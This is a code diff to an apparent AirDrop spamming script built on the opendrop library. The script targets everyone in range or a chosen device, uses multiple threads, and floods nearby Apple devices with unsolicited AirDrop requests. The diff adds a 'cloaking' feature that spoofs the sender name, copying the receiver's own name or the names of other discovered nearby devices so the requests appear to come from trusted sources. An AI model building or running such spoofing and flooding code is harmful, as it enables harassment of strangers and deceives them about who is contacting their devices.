@@ -11,6 +11,7 @@ import logging
 import plistlib
 import random
 import threading
+import time
 
 from colorama import Fore, Back, Style
 
@@ -20,9 +21,9 @@ from opendrop.config import AirDropConfig, AirDropReceiverFlags
 #   ==  config  ==  #
 
 #   Name used for Airdrop sender.
-SENDER_NAME = 'Your Autoclicker is trash.'
+SENDER_NAME = ' '
 
-#   If true, ignores SENDER_NAME and uses Receiver name.
+#   If true, mimicks other airdrop names or the recievers name
 cloaking = True
 
 #   Amount of threads to be used per target
@@ -34,6 +35,7 @@ whitelist = []
 
 #   ==  config  ==  #
 
+cloaking_things = []
 target = input("Enter Target (blank == everyone): ") or None
 
 #   Message to show for iOS devices.
@@ -61,7 +63,7 @@ logging.basicConfig(level=logging.INFO, format=f'{Style.DIM}%(asctime)s{Style.RE
 
 def gen_body(node_info):
     ask_body = {
-        'SenderComputerName': node_info['name'],
+        'SenderComputerName': SENDER_NAME,
         'SenderModelName': rand(),
         'SenderID': rand(),
         'BundleID': 'com.apple.finder',
@@ -71,8 +73,17 @@ def gen_body(node_info):
         }]
     }
 
-    if cloaking != True:
-        ask_body['SenderComputerName'] = SENDER_NAME
+    if cloaking == True:
+        if len(cloaking_things) != 0:
+            if len(cloaking_things) >= 2:
+                while True:
+                    ask_body['SenderComputerName'] = random.choice(cloaking_things)
+                    if ask_body['SenderComputerName'] != node_info['name']:
+                        break
+            else:
+                ask_body['SenderComputerName'] = random.choice(cloaking_things)
+        else:
+            ask_body['SenderComputerName'] = node_info['name']
 
     return ask_body
 
@@ -162,6 +173,8 @@ def on_receiver_found(info):
     if discoverable:
         additional = f'{Style.DIM}{id} {hostname} [{address}]:{port}{Style.RESET_ALL}'
         logger.info('🔍 Found       {:32}   {}'.format(Fore.GREEN + receiver_name + Fore.RESET, additional))
+        if receiver_name not in whitelist:
+            cloaking_things.append(receiver_name)
         if receiver_name in whitelist:
             logger.info('❌ Ignoring    {:32}   {}'.format(Fore.RED + receiver_name + Fore.RESET, additional))
         else:
